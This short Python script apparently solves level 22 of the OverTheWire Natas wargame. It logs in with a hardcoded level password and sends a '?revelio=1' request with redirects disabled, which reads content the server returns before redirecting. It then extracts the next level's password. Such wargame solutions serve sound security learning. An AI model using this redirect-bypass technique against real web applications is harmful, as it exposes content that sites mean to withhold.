import requests
import re

username ='natas22'
password ='chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()
responce = session.get(url+"?revelio=1",auth=(username,password),allow_redirects=False)
content = responce.text
print(content)
print("the password for natas23 is = ",re.findall("Password: (.*)</pre>",content)[0])
 